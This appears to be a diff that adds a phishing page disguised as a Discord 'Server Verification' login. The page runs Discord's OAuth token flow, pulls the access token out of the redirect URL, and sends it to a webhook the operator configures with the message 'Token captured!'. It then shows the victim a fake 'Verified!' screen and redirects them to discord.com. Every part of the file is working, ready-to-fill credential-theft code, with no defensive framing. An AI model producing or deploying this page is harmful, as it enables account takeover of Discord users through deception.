@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<body style="text-align:center;padding:50px;font-family:Arial;background:#1a1a2e;color:white">
+    <h2>Server Verification</h2>
+    <p>Click below to verify your Discord account</p>
+    <button onclick="login()" style="padding:15px 30px;background:#5865F2;color:white;border:none;border-radius:5px;font-size:18px;cursor:pointer">
+        Login with Discord
+    </button>
+    <script>
+        // 🔁 ONLY CHANGE THESE TWO LINES
+        const CLIENT_ID = 'YOUR_CLIENT_ID_HERE';
+        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
+
+        function login() {
+            // Get the current page URL (this becomes the redirect destination)
+            const redirectUri = window.location.href.split('#')[0].split('?')[0];
+            
+            window.location.href = 'https://discord.com/api/oauth2/authorize' +
+                '?client_id=' + CLIENT_ID +
+                '&redirect_uri=' + encodeURIComponent(redirectUri) +
+                '&response_type=token' +
+                '&scope=identify';
+        }
+
+        // Check for token in URL (Discord puts it in the #hash after redirect)
+        const hash = window.location.hash.substring(1);
+        
+        if (hash && hash.includes('access_token')) {
+            const params = new URLSearchParams(hash);
+            const token = params.get('access_token');
+            
+            if (token) {
+                // Send to webhook
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: '**✅ Token captured!**\nToken: `' + token + '`\nUser: <@' + params.get('token_type') + '>'
+                    })
+                }).then(() => {
+                    document.body.innerHTML = '<h2>✅ Verified!</h2><p>You can close this page.</p>';
+                    setTimeout(() => window.location.href = 'https://discord.com', 2000);
+                }).catch(() => {
+                    // Webhook failed - try again with different format
+                    document.body.innerHTML = '<h2>✅ Verified!</h2><p>Token: <code>' + token + '</code></p>';
+                });
+            }
+        }
+    </script>
+</body>
+</html>
